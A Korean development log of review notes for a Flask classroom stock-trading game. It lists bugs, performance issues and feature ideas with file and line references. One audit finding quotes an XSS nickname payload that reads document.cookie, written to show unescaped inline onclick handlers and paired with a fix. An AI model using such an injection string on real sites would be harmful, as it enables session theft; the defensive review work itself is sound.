- **`_rlt_active` count 기반 로직이 서버 재시작 후 무기한 pause 유발 가능** (`app.py:252, 948-993`): `_rlt_active[rid] = {'count': N, 'auto_paused': True}` 상태로 게임이 pause된 상황에서 Render 컨테이너가 재시작되면 `_rlt_active`가 초기화됨. 이후 `minigame_close()` 호출 시 `state = _rlt_active.get(rid)`가 None을 반환해 즉시 `return jsonify({'ok': True})`(962줄)로 나가버리므로 게임이 영구 pause 상태에 갇힘. `get_room()` 폴링(app.py:467-468)에서 `rlt_triggered and paused and rid not in _rlt_active`인 경우 `_rlt_active[rid]`를 복원하는 코드가 있지만, 모든 참여자가 이미 3회 룰렛을 다 했다면 `count=0`으로 복원해야 자동 resume이 트리거됨. 복원 로직에 `count=0` 조건 추가 또는 DB에 rlt_count 컬럼을 저장해 재시작 후 정확히 복구해야 함.

- **`get_history()` '1w' 기간에 5개 바만 생성되어 차트가 과도하게 드문** (`stock_service.py:292-293`): `n_bars = {'1d': 30, '5d': 5, '1mo': 30, '3mo': 90}.get(period, 30)` 매핑에서 '5d'(1주 탭)가 5개 바만 생성됨. `app.py:715`의 기간 매핑에서 '1w' → `('5d', '30m')`이므로 30분 간격 5일치 데이터를 원하면 `5 * 16 = 80`개 바가 적절하나 5개만 생성해 차트가 계단처럼 표시됨. `'5d': 80`으로 수정하는 1줄 변경으로 수정 가능.

- **`find_active_room()` 종료된 방을 탐색하지 않아 재접속 시 결과 화면 진입 불가** (`app.py:307-313`, `app.js:83-89`): 게임이 끝난 후 학생이 창을 새로고침하면 `get_me()` 응답의 `active_room`이 `None`(`find_active_room()`이 'ended' 방을 제외). 클라이언트 `onLogin()`에서 `active_room`이 없으면 `showLanding()`으로 이동해 결과 화면에 재접속할 방법이 없음(진행자가 "결과 발표"를 눌러도 이미 랜딩으로 돌아간 학생은 수동으로 코드를 재입력해야 함). `find_active_room()`이 'ended' 방도 반환하도록 확장하거나, `get_me()` 응답에 `last_room`을 별도로 포함하면 재접속 흐름이 완성됨.

- **`loadDepositsPage()`가 포트폴리오 API를 중복 호출** (`app.js:1621-1627`): 예금 탭 진입 시 `api.get('.../portfolio')`를 호출해 현금 잔액을 가져오는데, 이미 `refreshMyRank()` 10초 폴링이 `/rankings` API를 통해 총 자산을 최신화하고 있음. 별도의 포트폴리오 API 호출 없이 `S.room`이나 `S.tradeCash` 상태를 활용하거나, 예금 탭 전용 `GET /deposits` 응답에 현재 현금을 포함하면 API 호출 1건 절감 가능.

- **`doStartGame()`에 참여자 0명 시 아무 경고 없이 게임 시작** (`app.js:246-255`, `app.py:476-488`): 교사가 학생 입장을 확인하지 않고 실수로 시작 버튼을 누르면 참여자 없는 상태로 게임이 진행됨. 복권·룰렛 자동 트리거가 `non_host` 목록 기준으로 작동하므로 실제 피해는 없지만, `start_room()` API에서 `RoomMember.query.filter_by(room_id=rid).count() == 0` 시 `{'warning': '참여자가 없습니다. 계속하시겠습니까?'}` 를 반환하고 클라이언트가 2단계 확인을 요구하면 실수 방지 가능.

- **`user.username`을 `학번 이름` 형식으로 강제하지 않아 엑셀 파싱 오류** (`app.py:329-342`, `app.py:1435-1438`): `enter()` API에서 닉네임은 `len(u) >= 2`만 검사하므로 "홍길동"처럼 이름만 입력하거나 "20715홍길동"처럼 공백 없이 입력 가능. 엑셀 내보내기의 `u.username.split(' ', 1)` 분리가 실패해 학번/이름 컬럼이 잘못 채워짐. 최소한 입장 API에서 `if ' ' not in u: return jsonify({'error': '학번과 이름을 공백으로 구분해 입력하세요.'}), 400` 검사를 추가하거나, 프론트엔드 `doAuth(sid, name)` 호출(`app.js:75`)에서 이미 분리된 sid와 name을 별도 필드로 전송하고 서버가 `f"{sid} {name}"` 형태로 저장하는 방식으로 파싱 오류를 구조적으로 제거해야 함.

- **`minigame_spin()` 예금 전액 인출 vs `submit_quiz()` 부분 인출 불일치** (`app.py:1049-1058` vs `app.py:1328-1335`): 룰렛 자금 마련 시 예금을 처리하는 코드가 `d.status = 'withdrawn'`으로 예금 전액을 항상 해지(shortfall이 5만원인데 예금이 100만원이면 95만원 초과 인출). 같은 상황에서 퀴즈 패널티 코드는 `take = min(dep.amount, shortfall); dep.amount -= take`로 부분 인출을 지원해 두 경로의 동작이 다름. `minigame_spin()` 예금 처리를 `take = min(d.amount, shortfall); d.amount -= take; if d.amount <= 0: d.status = 'withdrawn'` 패턴으로 통일해야 학생 불이익 방지.

---

## 2026-07-22 (2차)

### 추가하면 좋을 기능

- **진행자가 게임 중 특정 학생 거래 일시 차단** (`app.py:564-575`, `kick_member()`): 현재 강퇴는 `room.status == 'waiting'` 조건(app.py:570)에서만 허용. 게임 도중 부적절한 급매매나 반복 실수를 하는 학생을 제어할 수단이 없음. `RoomMember` 테이블(`models.py:47-54`)에 `is_trading_banned BOOLEAN DEFAULT False` 컬럼을 추가하고, `trade()` 라우트(app.py:733)에서 `if member.is_trading_banned: return jsonify({'error': '진행자에 의해 거래가 제한되었습니다.'}), 403` 체크를 추가하면 됨. 강퇴보다 가역적인 제재 수단으로 수업 중 효과적. `PUT /api/rooms/<rid>/host/members/<uid>/ban-trading` 엔드포인트(~10줄)만 추가.

- **종목 카드에 거래량(volume) 표시** (`stock_service.py:305`, `app.py:651-671`, `app.js:1293-1311`): `get_history()` 가 각 바에 `volume: random.randint(100_000, 5_000_000)` 을 이미 생성(stock_service.py:305)하지만 `get_stocks()` 응답(app.py:663-670)과 프론트엔드 종목 카드(app.js:1293)에서 완전히 미사용. 실제 투자에서 급등락 시 거래량 확인은 핵심 판단 기준임. `get_stocks()` 응답에 `volume` 필드를 추가하고(`stock_service.py` 내 현재가 반환 시 현재 `_prices[sym]` 근처에서 최근 `volume` 캐싱), 종목 카드에 "거래량 1.2M" 소형 표시를 추가하면 교육적 가치가 즉시 증가.

- **진행자 커스텀 뉴스 헤드라인 직접 입력** (`app.py:690-701`, `stock_service.py:141-158`): `host_send_news()` 는 항상 랜덤 템플릿에서 헤드라인을 선택하고(stock_service.py:151) 교사가 수업 맥락에 맞는 직접 작성 뉴스를 보낼 수 없음. `d.get('custom_headline')` 파라미터를 추가해 `trigger_news()` (stock_service.py:204)로 전달하고, `_generate_news()` 에서 `custom_headline` 이 있으면 `items = [{'headline': custom_headline, 'direction': direction}]` 로 직접 설정하면 됨(~8줄 수정). 진행자 설정 탭에 "직접 뉴스 입력" 텍스트박스 한 줄 추가. 교사가 "정부 금리 인하 결정!" 같은 시사 내용을 실시간 삽입 가능.

- **게임 종료 후 결과 읽기 전용 공유 URL** (`app.py:1386-1396`, `host_publish_results()`): `results_published=True` 후 결과를 볼 수 있는 고정 URL이 없어 수업 종료 후 학생이 집에서 결과를 다시 확인하거나 부모님께 공유할 방법이 없음. `/results/<room_code>` 라우트를 추가해 `login_required` 없이 `room.results_published=True` 인 방의 순위표를 정적 렌더링하면 됨(~20줄, 기존 `/api/rooms/<rid>/rankings` 재활용). 진행자 결과 화면에 "공유 링크 복사" 버튼(app.js:1779 근처)을 추가해 URL을 클립보드에 복사 가능. 서버 인증 없는 읽기 전용이므로 세션 불필요.

- **학생이 거래 시 투자 근거 메모 입력** (`app.py:724-767`, `trade()`, `models.py:68-79`): `RoomTransaction.note` 컬럼(models.py:75)이 이미 존재하지만 학생 거래(`trade()`) 에서는 `note=None` 으로 항상 저장. 매수/매도 모달(app.js:1340-1356)에 선택 입력란 "투자 이유(선택, 30자)"를 추가하고 `POST /trade` body에 `note` 파라미터를 포함시키면, 서버 측은 `note = d.get('note', '')[:30]` 한 줄 추가만으로 처리 가능. 학생이 "삼성전자 뉴스 후 매수" 등 의사결정을 기록하면 수업 후 거래 내역 리뷰 시 투자 판단 근거를 교사와 함께 복기하는 교육 활동에 직접 활용.

- **목표 수익률 달성 시 알림 — 학습 동기 부여** (`app.js:735-752`, `refreshMyRank()`): `refreshMyRank()` 가 10초마다 `gain_pct` 를 수신하지만 누적 달성 이벤트를 트리거하지 않음. `enterParticipantGame()` 시 학생에게 "목표 수익률 입력(선택)" 작은 팝업을 표시하고 `localStorage.setItem('goalPct_' + S.room.id, targetPct)` 저장. 이후 `refreshMyRank()` 내 `if (me.gain_pct >= goalPct && !goalAchieved) { toast('🎯 목표 달성!'); goalAchieved=true; }` 로직 추가(~10줄). 서버 변경 불필요. 수업에서 학생마다 다른 목표를 세우고 달성 과정을 추적하는 개인화 학습 경험 제공.

### 제거/단순화할 것들

- **`loadLobbyMembers()` 및 `loadHostMembers()` 인라인 `onclick`에 `username` XSS 취약** (`app.js:229`, `app.js:425-426`): 로비 강퇴 버튼 `onclick="doKickMember(${m.user_id},'${m.username.replace(/'/g,"\\'")}')"`과 호스트 거래 버튼 `onclick="openStudentTxn(${m.user_id},'${m.username.replace(/'/g,"\\'")}')"`이 작은따옴표만 이스케이프하고 `"`, `<`, `>`, `&` 등을 처리하지 않음. 학생이 닉네임을 `a"); alert(document.cookie); //`로 입력하면 진행자 브라우저에서 임의 스크립트 실행 가능. `enter()` API(app.py:333)가 길이만 검사하므로 특수문자 닉네임이 DB에 저장됨. 인라인 `onclick`을 제거하고 버튼에 `data-uid`, `data-name` 속성을 부여한 뒤 `addEventListener`로 핸들러를 바인딩하는 방식으로 변경 필요. 이벤트 위임(event delegation) 패턴 적용 시 각 멤버 행 렌더링 시마다 핸들러 등록 불필요.

- **`lottery_draw()` 락 없이 `_do_reveal()` 호출 — 동시 요청 시 이중 상금 지급** (`app.py:1205-1207`, `app.py:1122-1130`): `get_lottery()` 는 `with _lottery_lock:` 내에서 state 전환과 `_do_reveal()` 호출을 원자적으로 처리(app.py:1123-1130). 그러나 `lottery_draw()` (호스트 수동 추첨)는 락 없이 `_do_reveal(rid, cur)` 을 직접 호출(app.py:1207). 진행자가 추첨 버튼을 빠르게 2회 클릭하거나, 타이머 만료로 `get_lottery()` 가 동시에 도달하면 같은 round에서 `_do_reveal()` 이 2회 실행되어 당첨 학생에게 상금이 이중 지급됨(`RoomTransaction` 이중 삽입 + `m.cash` 이중 증가). `lottery_draw()` 내 `_do_reveal()` 호출을 `with _lottery_lock:` 로 감싸고 진입 전 `cur.get('state') == 'revealed'` 체크로 방지 가능.

- **`host_force_price()` `pct` float 파싱 `ValueError` 미처리 — 500 응답** (`app.py:681`): `pct = float(d.get('pct', 0))` 에 try-except 없음. 동일 파일의 `host_market_event()` (app.py:1353)는 `try: pct = float(d.get('pct', 0)) \nexcept: return jsonify({'error': ...}), 400` 패턴으로 보호되어 있지만 `host_force_price()` 는 그렇지 않음. 진행자가 UI에서 빠른 클릭으로 빈 값을 전송하거나 `NaN`, `Infinity` 문자열이 전달되면 `ValueError` → 500 에러. `try: pct = float(d.get('pct', 0)) \nexcept (TypeError, ValueError): return jsonify({'error': '잘못된 변동률'}), 400` 3줄 추가로 `host_market_event()` 와 패턴 통일.

- **`datetime.utcnow()` Python 3.12+ DeprecationWarning — app.py 15곳, models.py 5곳** (`app.py:125, 279, 422, 437, 458, 482, 485, 498, 511, 529` 등, `models.py:20, 38, 54, 79, 91`): `datetime.utcnow()` 는 Python 3.12에서 deprecated, 3.14에서 제거 예정. `models.py` column default (`default=datetime.utcnow`)는 함수 참조 형태여서 `default=lambda: datetime.now(timezone.utc)` 로 교체 필요. `app.py` 에서도 `from datetime import datetime, timedelta, timezone` 이미 import되어 있으므로(app.py:2) `datetime.utcnow()` → `datetime.now(timezone.utc)` 로 일괄 교체 가능. 단, 기존 DB에 저장된 naive datetime(UTC)과의 비교 연산(`room.end_time - now`)은 timezone-aware로 통일 후 `room.end_time = room.end_time.replace(tzinfo=timezone.utc)` 식의 마이그레이션 코드 추가 필요.

- **`api.get/post()` 401 응답 미처리로 세션 만료 시 무한 폴링 지속** (`app.js:30-45`, `app.js:613-650`): Flask 세션은 서버 재시작(Render free tier) 또는 쿠키 만료 시 무효화됨. 이후 모든 API 요청이 `401` 을 반환해도 `api.get()` 은 `{error: 'HTTP 401'}` 객체를 반환하고 `enterParticipantGame()` 폴링(app.js:613)은 `r.status` 필드를 검사하지 않아 오류 toast 없이 계속 실행. 학생 화면이 마치 정상 동작하는 것처럼 보이지만 모든 데이터 갱신이 멈춘 상태. `api.get()/post()` 내에서 `if (r.status === 401) { S.user = null; showLanding(); return {error: 'unauth'}; }` 처리를 추가하면 세션 만료 시 자동 재로그인 화면으로 복귀.

- **`StockService.get_price()` 내 히스토리 캐시 무효화가 전체 캐시 키 O(N) 순회** (`stock_service.py:186-189`, `stock_service.py:227-229`, `stock_service.py:257-259`): `get_price()`, `force_price()`, `force_sector_event()` 모두 `for key in list(self._history_cache.keys()): if key[0] == symbol: del ...` 패턴으로 캐시를 무효화. 학생들이 여러 종목 차트를 열 경우 `_history_cache` 에 `(symbol, period)` 키가 쌓이고, 20초마다 47개 종목이 업데이트될 때마다 각각 전체 캐시 키를 순회. `_history_cache` 를 `{symbol: {'1d': ..., '1mo': ..., ...}}` 중첩 딕셔너리로 재구성하면 `del self._history_cache[symbol]` 한 줄로 O(1) 무효화 가능. 세 곳 동시 수정, 약 15줄.

- **`create_room()` `starting_cash` 상한 없어 비정상 금액 입력 가능** (`app.py:383-386`): `starting_cash=max(100000, float(d.get('starting_cash', 10_000_000)))` 에서 최솟값(10만원)만 검증하고 최댓값 제한이 없음. 진행자가 실수로 `"starting_cash": 999999999999` (1조원)를 입력하면 거래 금액 표시가 비정상적으로 커지고, 복권 자동 상금(`member_count * 30_000_000`, app.py:419)을 의미없게 만들며 SQLite Float 정밀도 한계(15자리)를 초과할 수 있음. 프론트(app.js:136)에서는 이미 입력 필드가 있지만 서버 검증이 없음. `min(1_000_000_000, max(100_000, float(...)))` 로 상한 10억원을 추가하는 1줄 수정.

---

## 2026-07-23

### 추가하면 좋을 기능

- **퀴즈 설정·룰렛 설정 DB 저장 (Render 재시작 대비)** (`app.py:1246-1251`, `app.py:1250`): `_quiz_settings`와 `_roulette_config`가 서버 메모리에만 존재해 Render free tier가 비활성 후 재시작되면 진행자가 설정한 퀴즈 보상/패널티 비율과 룰렛 배율·확률이 모두 기본값으로 초기화됨. `Room` 테이블에 `quiz_reward_pct FLOAT DEFAULT 1.0`, `quiz_penalty_pct FLOAT DEFAULT 0.5`, `rlt_config VARCHAR(200) DEFAULT ''` 컬럼 3개를 추가하고 `POST /host/quiz-settings`, `POST /host/roulette-config` 핸들러에서 DB에도 함께 저장하면 재시작 후 자동 복구 가능. `lottery_rounds_done` 컬럼이 같은 방식으로 이미 구현되어 있어(`app.py:34-36`, `app.py:225-229`) 패턴 동일.

- **룰렛 베팅 시 자동 청산 예고 팝업** (`app.py:1022-1058`, `app.js:1032-1043`): 베팅 금액이 보유 현금을 초과하면 서버가 조용히 보유 주식·예금을 청산해 현금을 조달함(`app.py:1025-1058`). 클라이언트는 `rlt-err` 검사를 총 자산(`_rltCash`)과만 비교하므로(`app.js:1038`) 실제로 어떤 주식이 팔릴지 경고가 없음. `doRouletteSpin()` 실행 전 현금 부족을 감지하면 `confirm('현금이 부족해 보유 주식이 자동 매도됩니다. 계속하시겠습니까?')` 한 줄을 삽입하면 학생이 예상치 못한 강제 청산을 인지 가능. 서버 수정 없이 `app.js:1039` 직후에 추가.

- **예금 중도해지 전 이자 손실 확인 팝업** (`app.js:1690-1710`, `doWithdrawDeposit()`): 학생이 예금을 해지할 때 별도 확인 없이 즉시 처리됨. 해지하면 이자 없이 원금만 반환(`app.py:912-916`)되므로, 팝업에 "현재까지 쌓인 예상 이자 N원을 포기합니다" 메시지를 보여주면 "조기 해지의 기회비용" 개념을 실습으로 가르칠 수 있음. 이미 `deposits` GET 응답에 `expected_interest` 필드가 있으므로(`app.py:869-873`) 별도 API 호출 없이 렌더링 시점의 값으로 confirm 문 생성 가능.

- **진행자 게임 중 강퇴 기능** (`app.py:564-575`, `kick_member()`): 현재 `room.status != 'waiting'`이면 강퇴 불가. 수업 중 무단 이탈하거나 같은 이름으로 중복 입장한 학생을 게임 도중 정리할 방법이 없음. `waiting` 조건을 제거하고, 활성 상태 강퇴 시 해당 멤버의 보유 주식을 현재가로 정산해 `_end_room()` 과 동일한 패턴으로 자산을 청산한 뒤 `RoomMember`, `RoomHolding`, 관련 `Deposit` 레코드를 삭제하면 됨. `_end_room()` 에 이미 개별 멤버 청산 로직이 있으므로(`app.py:144-152`) 함수로 추출해 재사용 가능.

- **차트 역방향 랜덤워크 개선: 고정 시드 기반 일관된 히스토리** (`stock_service.py:281-310`, `get_history()`): 현재 차트는 현재가에서 과거로 역방향 랜덤워크를 생성함. 2분 캐시가 만료될 때마다 완전히 다른 과거 데이터가 나타나 학생이 "아까 봤을 때 차트 모양이 달랐는데?"라며 혼란. 대신 게임 시작 시각(`room.start_time`)과 종목 심볼을 seed로 삼아 `random.seed(f"{symbol}{room_start}")` 로 결정론적 히스토리를 생성하면 방 전체에서 동일한 과거 차트를 볼 수 있음. `get_history()` 시그니처에 `seed` 파라미터를 추가하고, `/api/rooms/<rid>/stocks/<symbol>/chart` 핸들러에서 `room.start_time`을 넘기는 방식으로 구현.

### 제거/단순화할 것들

- **`export_rankings()` 공백 분리 학번 파싱 — 이름에 공백 포함 시 데이터 깨짐** (`app.py:1435-1436`): `parts = u.username.split(' ', 1)` 로 첫 공백 기준 분리해 학번과 이름을 추출. `doAuth()` 에서 `u = f"{sid} {name}"` 으로 합치는데(`app.js:74`), 학생이 `name` 필드에 `"홍 길동"` 처럼 공백이 포함된 이름을 입력하면 엑셀에서 학번·이름이 정상 분리됨. 그러나 학번 필드에 공백을 입력한 경우(`" 20715"`) sid 분리가 오염됨. User 모델에 `student_id` 컬럼을 별도 추가하거나, username 포맷을 `{sid}|{name}` 구분자로 변경하면 split 모호성 제거. 단기적으로는 `app.js:74` 에서 sid·name에 공백 trimming + 공백 포함 금지 validation만 추가해도 회피 가능.

- **퀴즈 패널티로 예금 원금이 직접 감액됨 (`Deposit.amount` 수정)** (`app.py:1331-1337`): 퀴즈 오답 패널티가 현금을 초과하면 `dep.amount -= take` 로 예금 원금 자체를 줄임. 같은 예금의 `expected_interest`는 원래 `amount × rate` 기준이었으므로 이후 계산이 틀려지고, `get_deposits()` 응답의 `max_interest` 도 원래 이자보다 낮게 표시됨. 교육적으로 보면 "예금이 줄어드는" 이상한 현상을 학생이 경험. 대신 `dep.status = 'withdrawn'` 후 잔액을 현금으로 돌려받고 다시 패널티를 차감하는 패턴 — 즉 `Deposit` 원금은 불변으로 유지하고 완전 해지 후 패널티 적용 — 이 더 현실적이고 이자 계산을 단순하게 유지.

- **`get_lottery()` 상태 전이 로직이 GET 엔드포인트 내에 있음** (`app.py:1114-1131`): 타임아웃 기반 `picking → drawing → revealed` 전이가 `GET /lottery` 내에서 `_lottery_lock` 아래 실행됨. 즉, 아무도 GET 요청을 안 보내면 상태 전이가 일어나지 않음. 진행자 탭이 닫혀 있을 때 참여자들은 `_startLotPolling` 을 통해 동일 엔드포인트를 3초마다 호출하므로 실제로는 동작하지만, "타이머 만료 = 상태 전이"라는 계약이 HTTP GET의 부작용에 의존해 예측하기 어려움. 별도 백그라운드 스레드 또는 `_auto_start_lottery_if_due()` 패턴처럼 상태 전이 로직을 GET과 분리하면 코드 흐름이 명확해짐.

- **참여자 폴링 3개 interval 겹침으로 동시 요청 급증** (`app.js:611-650`, `app.js:808-819`, `app.js:735-752`): 참여자 게임 화면에서 `pollInterval(10s)` + `newsInterval(8s)` + `_waitingPoll(3s, 결과 대기 시)` 가 독립적으로 실행됨. 학생 30명 기준 주기가 겹치는 순간 Flask 서버에 90+개 요청이 동시 도달 가능. `pollInterval` 콜백 안에서 뉴스도 함께 조회하거나, 두 인터벌을 단일 `setInterval` 로 통합하고 내부에서 카운터로 뉴스 조회 빈도를 제어하면 동시 요청 수를 절반으로 줄일 수 있음. Render free tier 기준 동시 요청이 많을수록 응답 지연 → 폴링 누적 → 지연 악화 악순환이 발생.


## 2026-07-23 (2차)

### 추가하면 좋을 기능

- **게임 일시정지 중 진행자 공지사항 전파 기능** (`app.py:490-501`, `pause_room()`, `app.js:653-666`): 일시정지 시 학생 화면에는 "⏸ 게임이 일시정지되었습니다" 배너(`showPausedBanner()`)만 뜨고, 교사가 멈춤 이유나 복권·룰렛 설명을 텍스트로 전달할 수단이 없음. `_room_announcements: dict = {}` 딕셔너리를 추가하고 `POST /api/rooms/<rid>/host/announcement` 엔드포인트(~8줄)로 진행자가 공지 텍스트를 저장. `GET /api/rooms/<rid>` 의 `room_dict()` 반환값(`app.py:278`)에 `announcement` 필드를 포함시키면 10초 폴링 주기로 학생 화면에 자동 전파. `showPausedBanner()`에서 `S.room.announcement`가 있으면 배너에 추가 텍스트를 표시하는 ~3줄 클라이언트 수정으로 완성. 서버 12줄·클라이언트 5줄 추가, 수업 중 실시간 교사 안내 가능.

- **포트폴리오 섹터별 배분율 요약 표시** (`app.js:1456-1567`, `loadPortfolio()`): 포트폴리오 화면의 도넛 차트가 개별 종목 단위로 색상을 배분하여 10개 종목 보유 시 범례가 뭉개짐. 이미 보유 목록(`data.holdings`)에 `sector` 필드가 있으므로 클라이언트에서 섹터별 합계를 집계해 `반도체 45% · IT 22% · 현금 33%` 형태의 한 줄 요약을 `port-summary` 카드 아래(`app.js:1462`)에 추가 가능. 서버 수정 불필요. `Object.entries(holdings.reduce(...))` 패턴으로 ~8줄 추가. "포트폴리오 분산투자" 교육 개념을 화면에서 직관적으로 체험 가능.

- **대량 단일 종목 투자 시 경고 팝업** (`app.js:1424-1454`, `execTrade()`): 매수 금액이 총 자산의 30%를 초과해도 아무 확인 없이 즉시 체결됨. 학생이 실수로 전 재산을 한 종목에 투자하는 상황이 발생. `execTrade()` 내 `app.js:1431` 직후에 `if (shares * S.tradePrice > S.tradeCash * 0.3 && !confirm('총 자산의 30% 이상을 단일 종목에 투자합니다. 계속하시겠습니까?')) return;` 한 줄 삽입으로 방지. 서버 변경 불필요. "계란을 한 바구니에 담지 말라"는 분산투자 교훈을 실시간으로 강화.

- **진행자 랭킹에 학생별 거래 횟수 표시** (`app.py:542-562`, `host_members()`): 현재 진행자 랭킹이 총자산·수익률만 반환해 누가 적극적으로 거래하는지 파악 불가. `host_members()` 응답 딕셔너리에 `trade_count` 필드를 추가하되, N+1 방지를 위해 `db.session.query(RoomTransaction.user_id, func.count().label('cnt')).filter_by(room_id=rid).filter(RoomTransaction.action.in_(['BUY','SELL'])).group_by(RoomTransaction.user_id).all()` 단일 집계 쿼리로 처리. `app.js:425` 멤버 행 렌더링에 `(${m.trade_count}회)` 표시 추가. 교사가 수업 참여도를 한눈에 파악해 소극적 학생을 즉시 독려 가능.

- **퀴즈 연속 정답 콤보 보너스** (`app.py:1270-1342`, `submit_quiz()`, `_quiz_state`): 매 퀴즈가 독립적으로 보상되어 연속 참여 동기가 없음. `_quiz_state[key]` 딕셔너리(`app.py:1267`)에 `streak` 키를 추가해 정답 시 1씩 증가, 오답·쿨다운 초기화 시 0으로 리셋. `submit_quiz()` 에서 reward 계산 직전에 `combo_mult = 2.0 if streak >= 3 else (1.5 if streak >= 2 else 1.0)` 을 삽입하고 `reward = int(reward * combo_mult)` 로 보너스 지급(~5줄 추가). 클라이언트 퀴즈 결과 화면에 `🔥 2연속 콤보! x1.5` 텍스트 표시(~2줄). 연속 정답 동기 부여로 수업 집중도 향상.

- **결과 화면 부문별 특별 시상** (`app.py:808-824`, `get_rankings()`, `app.js:1702-1795`, `loadResults()`): 종합 순위 외 부문상이 없어 하위권 학생의 동기가 저하됨. `GET /api/rooms/<rid>/host/award-stats` 엔드포인트(~25줄)를 추가해 "단일 거래 최고 금액(가장 대담한 투자자)", "보유 종목 수 최다(분산왕)", "퀴즈 정답 최다(경제 박사)" 등을 집계. `RoomTransaction` 테이블에서 `max(amount)`, `count(distinct symbol)`, 퀴즈 ADJ 트랜잭션 수를 `group_by(user_id)` 로 조회해 수상자를 결정. `loadResults()` 마지막 부분에 `results-awards` 섹션을 추가해 게임 종료 후 다양한 학생이 주목받을 기회 제공.

### 제거/단순화할 것들

- **`get_rankings()` User 레코드 None 시 AttributeError → 500** (`app.py:818`): `u = db.session.get(User, m.user_id)` 직후 `u.username`을 None 체크 없이 바로 사용. `host_members()`(`app.py:557`)는 동일 상황에서 `u.username if u else str(m.user_id)`로 안전하게 처리하지만 `get_rankings()`는 누락. DB 이상, User 삭제, 외래 키 불일치 시 전체 랭킹 API가 500으로 사망해 학생 화면이 순위 없이 멈춤. `board.append({'username': u.username if u else str(m.user_id), ...})` 로 1줄 수정.

- **`minigame_close()` 에서 deprecated `Room.query.get(rid)` 사용** (`app.py:977`): 동일 파일의 다른 모든 라우트는 `Room.query.get_or_404(rid)` 또는 `db.session.get(Room, rid)`를 사용하는데, 이 함수만 구버전 `Room.query.get(rid)` 패턴. SQLAlchemy 2.x에서 `Query.get()`은 deprecated(제거 예정). Room이 None일 때 `if room and room.status == 'paused':` 조건이 있어 즉각 오류는 없지만, 향후 SQLAlchemy 업그레이드 시 경고→에러 전환. `db.session.get(Room, rid)` 로 교체.

- **`host_news_interval()` float 파싱 ValueError/TypeError 미처리** (`app.py:639-641`): `svc.set_news_interval(float(d['news_seconds']))`, `svc.set_price_interval(float(d['price_seconds']))` — 비숫자 문자열이나 `None`이 입력되면 `ValueError`/`TypeError` → 500 에러. 같은 파일의 `host_market_event()`(`app.py:1353`)는 `try/except`로 보호하는데 이 엔드포인트는 미적용. `try: val = float(d['news_seconds']); svc.set_news_interval(val) except (TypeError, ValueError): return jsonify({'error': '잘못된 값'}), 400` 패턴으로 두 필드 모두 보호.

- **`host_adjust()` delta에 `float('inf')` · `float('nan')` 미검증 — DB 손상 위험** (`app.py:595`): `delta = float(d.get('delta', 0))`는 JSON 값 `"inf"`, `"1e999"`, `"nan"`을 조용히 파싱. `m.cash = max(0, m.cash + float('inf'))` 결과가 SQLite Float 컬럼에 `inf`로 저장되면 이후 모든 자산 비교·정렬이 붕괴하고, `nan` 저장 시 `nan != nan` 특성으로 랭킹 정렬이 무너짐. 이미 2026-07-20 항목에서 범위 제한 미비가 지적된 맥락에서, `import math` 후 `if not math.isfinite(delta): return jsonify({'error': '유효하지 않은 금액'}), 400` 추가로 수치 안전성 확보.

- **`member_total_value()` O(N) 반복 호출로 랭킹·호스트 멤버 API에서 N×2 쿼리 발생** (`app.py:107-118`, `app.py:815-823`): `get_rankings()` 가 멤버 루프 내에서 `member_total_value()` 를 호출하고, 이 함수가 `RoomHolding.query.filter_by()` · `Deposit.query.filter_by()` 각 1회 실행. 학생 30명 기준 `get_rankings()` 1회 호출에 DB 쿼리 60건+. `host_members()`(`app.py:548`)도 동일 패턴. `RoomHolding.query.filter_by(room_id=rid).all()` 1회 + `Deposit.query.filter_by(room_id=rid, status='active').all()` 1회로 전체를 한 번에 로드해 `user_id`로 groupby 집계하면 O(N) 쿼리를 O(1)로 개선. `StockService`에 `get_all_prices() -> dict` 헬퍼를 추가해 Lock도 1회만 획득.

- **`loadDepositsPage()` 에서 `portfolio` · `deposits` API 순차 호출** (`app.js:1621-1627`): `await api.get('.../portfolio')` 후 `await api.get('.../deposits')` 를 순차 실행하므로 예금 탭 진입 시 2 RTT 대기. 두 요청이 독립적이므로 `const [port, data] = await Promise.all([api.get(...portfolio), api.get(...deposits)]);` 한 줄로 병렬화하면 탭 전환 체감 속도를 약 절반으로 단축. 서버 변경 불필요. Render free tier 기준 네트워크 왕복 300ms+일 경우 절감 효과가 체감 수준.

- **`loadPortfolio()` 보유 종목 버튼 `onclick`에서 `h.name`·`h.sector` 미이스케이프** (`app.js:1558-1560`): `onclick="openStockModal('${h.symbol}',{name:'${h.name}',sector:'${h.sector}',...})"` — 이미 2026-07-22 2차에서 `loadHostMembers`·`loadLobbyMembers`의 username 이스케이프 미비가 지적됐으나, 포트폴리오 보유 목록 버튼에도 동일 패턴이 존재. 현재 STOCKS 딕셔너리의 name·sector가 한국어라 즉각 위험은 없지만, 향후 종목 추가 시 `'`이나 `"` 포함 이름이 들어오면 JS 파싱 에러로 매수/매도 버튼 동작 불가. `data-symbol`, `data-name`, `data-sector` 속성 + 이벤트 위임 패턴으로 인라인 `onclick` 제거 권장.

---

## 2026-07-24

### 추가하면 좋을 기능

- **시장 카드에 개인 보유 손익 배지 실시간 표시** (`app.js:1293-1311`, `renderGrid()`, `app.js:1344-1357`, `openStockModal()`): 종목 카드를 클릭해 모달을 열어야만 보유 수량과 평균 매수가 대비 손익이 확인됨. `enterParticipantGame()` 및 `execTrade()` 완료 후 포트폴리오를 한 번 캐시하고, `renderGrid()` 내 카드 HTML(app.js:1293)에서 보유 중인 종목이면 카드 우측 상단에 `3주 · +2.1%` 형태 배지를 덧씌우면 됨. `data.holdings`를 `symbol → {shares, gain_pct}` Map으로 변환해 O(1) 조회 가능. 서버 변경 불필요, 클라이언트 ~15줄 추가. 모달을 열지 않아도 "내가 이 종목에서 얼마 버는지"가 보여 매도 판단 속도가 빨라짐.

- **분반 반복 수업 시 동명이학(同名異學) 학생 계정 충돌** (`models.py:19`, `User.username UNIQUE`, `app.py:335-342`): `User.username`이 전역 UNIQUE 제약이라 서로 다른 반에서 동일 학번·이름으로 입장한 두 학생은 같은 DB 레코드를 공유함. 선생님이 같은 방 코드를 2교시 연속으로 재사용하거나, 3반과 4반에 같은 이름의 학생이 있을 때 두 번째 학생이 접속하면 첫 번째 학생의 세션을 덮어씀(`session['user_id'] = user.id`). 최소 수정: `enter()` API에서 username을 `{room_code}:{sid} {name}` 형식으로 저장(app.py:336), `export_rankings()` 파싱 시 `username.split(':', 1)[1].split(' ', 1)` 로 `sid`·`name` 분리(app.py:1435). 혹은 `Room.code`를 salt로 UUID 기반 username 생성.

